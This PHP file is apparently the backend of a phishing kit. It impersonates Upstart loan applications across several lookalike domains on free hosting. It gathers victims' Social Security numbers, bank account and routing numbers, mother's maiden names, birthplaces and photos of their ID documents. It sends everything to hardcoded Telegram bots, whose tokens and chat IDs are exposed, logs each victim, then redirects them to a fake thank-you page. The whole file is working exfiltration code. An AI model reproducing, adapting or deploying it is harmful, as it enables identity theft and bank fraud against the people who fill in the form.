<?php

// include 'firewall.php';

// 🔐 Telegram configuration per domain
$site_map = [
    
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']

        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/thankyou.html'
    ],

    'upstarts.onrender.com' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8187021949:AAED4PdfxR4o4oRJjLMht3UnBDp52FFG8Ok', 'chat_id' => '5768557636']
        ],
        'redirect' => 'https://upstarts.onrender.com/cache_site/thankyou.html'
    ],

    'upstart-l69v.onrender.com' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
        ],
        'redirect' => 'https://upstart-l69v.onrender.com/cache_site/thankyou.html'
    ],

    'upstartloans-704y.onrender.com' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U', 'chat_id' => '7339107338']
        ],
        'redirect' => 'https://upstartloans-704y.onrender.com/cache_site/thankyou.html'
    ],

    
    'upstartsloan.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']

        ],
        'redirect' => 'https://upstartsloan.42web.io/cache_site/thankyou.html'
    ],


    // ➕ Add more site configs here
];


// 🧠 Detect form source domain
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed  = parse_url($referer);
$domain  = $parsed['host'] ?? 'unknown';
$config  = $site_map[$domain] ?? null;

if (!$config) {
    header("HTTP/1.1 403 Forbidden");
    exit("❌ Unauthorized domain: $domain");
}

$bots = $config['bots'];
$redirect_url = $config['redirect'];

// 📥 Process POST data
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    function val($key, $default = '') {
        return htmlspecialchars($key ?? $default);
    }

    // 🔐 Form values
    $desired_loan = val($_POST['q87_desiredLoan87']);
    $annual_income = val($_POST['q88_annualIncome']);
    $full_name = trim(val($_POST['q61_name']['prefix']) . ' ' . val($_POST['q61_name']['first']) . ' ' . val($_POST['q61_name']['last']));
    $email = val($_POST['q78_email78']);
    $phone = val($_POST['q72_phone']['full']);
    $birth_date = val($_POST['q62_birthDate62']['year']) . '-' . val($_POST['q62_birthDate62']['month']) . '-' . val($_POST['q62_birthDate62']['day']);
    $address = val($_POST['q76_address76']['addr_line1']) . ' ' .
               val($_POST['q76_address76']['addr_line2']) . ', ' .
               val($_POST['q76_address76']['city']) . ', ' .
               val($_POST['q76_address76']['state']) . ', ' .
               val($_POST['q76_address76']['postal']);

    $marital_status = val($_POST['q6_maritalStatus']);
    $social_security = val($_POST['q92_socialSecurity']);
    $fathers_name = trim(val($_POST['q105_fathersFull']['first']) . ' ' . val($_POST['q105_fathersFull']['last']));
    $mothers_name = trim(val($_POST['q106_mothersFull']['first']) . ' ' . val($_POST['q106_mothersFull']['last']));
    $place_of_birth = val($_POST['q107_placeofbirth']);
    $mothers_maiden = val($_POST['q108_mothersmaiden']);
    $employer = val($_POST['q113_presentEmployer']);
    $occupation = val($_POST['q30_occupation']);
    $years_exp = val($_POST['q79_yearsOf']);
    $gross_income = val($_POST['q80_grossMonthly80']);
    $rent = val($_POST['q81_monthlyRentmortgage']);
    $institution = val($_POST['q110_institutionName']);
    $account = val($_POST['q109_accountNumber']);
    $routing = val($_POST['q114_routingNumber']);
    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
    $timestamp = date("Y-m-d H:i:s");

    // 📎 File uploads
    $upload_dir = "uploads/";
    if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

    function handleUpload($name, $prefix) {
        global $upload_dir;
        if (!empty($_FILES[$name]['name'][0])) {
            $ext = pathinfo($_FILES[$name]['name'][0], PATHINFO_EXTENSION);
            $filename = $prefix . '_' . time() . '.' . $ext;
            $path = $upload_dir . $filename;
            if (move_uploaded_file($_FILES[$name]['tmp_name'][0], $path)) return $path;
        }
        return null;
    }

    $front_id_path = handleUpload('q94_uploadSelected94', 'front_id');
    $back_id_path = handleUpload('q95_uploadBack', 'back_id');

    // 📤 Build Telegram message
    $message = "📝 *New Loan Application*\n\n" .
               "💵 *Desired Loan:* $desired_loan\n" .
               "💰 *Annual Income:* $annual_income\n" .
               "👤 *Name:* $full_name\n" .
               "🎂 *DOB:* $birth_date\n" .
               "🏠 *Address:* $address\n" .
               "📧 *Email:* $email\n" .
               "📞 *Phone:* $phone\n" .
               "💼 *Occupation:* $occupation\n" .
               "📆 *Experience:* $years_exp\n" .
               "💸 *Monthly Income:* $gross_income\n" .
               "🏘️ *Rent/Mortgage:* $rent\n" .
               "🏦 *Bank:* $institution\n" .
               "💳 *Account:* $account\n" .
               "🔢 *Routing:* $routing\n" .
               "💍 *Marital:* $marital_status\n" .
               "👨 *Father:* $fathers_name\n" .
               "👩 *Mother:* $mothers_name\n" .
               "🗺️ *Birthplace:* $place_of_birth\n" .
               "👩 *Maiden Name:* $mothers_maiden\n" .
               "🏢 *Employer:* $employer\n" .
               "🔐 *SSN:* $social_security\n" .
               "🌐 *IP:* $ip\n" .
               "📎 *Files:* " . ($front_id_path && $back_id_path ? "✅ Yes" : "❌ Missing") . "\n" .
               "🕒 *Time:* $timestamp";

    // 🚀 Send to Telegram
    foreach ($bots as $bot) {
        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];
        $ch = curl_init("https://api.telegram.org/bot{$bot['token']}/sendMessage");
        curl_setopt_array($ch, [CURLOPT_POST => 1, CURLOPT_POSTFIELDS => $data, CURLOPT_RETURNTRANSFER => true]);
        curl_exec($ch); curl_close($ch);

        // Upload files
        foreach ([$front_id_path => '📎 Front ID', $back_id_path => '📎 Back ID'] as $file => $caption) {
            if (!$file || !file_exists($file)) continue;
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $is_image = in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
            $endpoint = $is_image ? 'sendPhoto' : 'sendDocument';
            $post = [
                'chat_id' => $bot['chat_id'],
                $is_image ? 'photo' : 'document' => new CURLFile(realpath($file)),
                'caption' => "$caption from $full_name",
                'parse_mode' => 'Markdown'
            ];
            $file_ch = curl_init("https://api.telegram.org/bot{$bot['token']}/$endpoint");
            curl_setopt_array($file_ch, [CURLOPT_POST => 1, CURLOPT_POSTFIELDS => $post, CURLOPT_RETURNTRANSFER => true]);
            curl_exec($file_ch); curl_close($file_ch);
        }
    }

    // 📝 Log submission
    file_put_contents("log.txt", "[$timestamp] $domain | $ip | $full_name | Loan: $desired_loan | Email: $email\n", FILE_APPEND);

    // ✅ Redirect to thank-you page
    header("Location: $redirect_url");
    exit;
}
?>
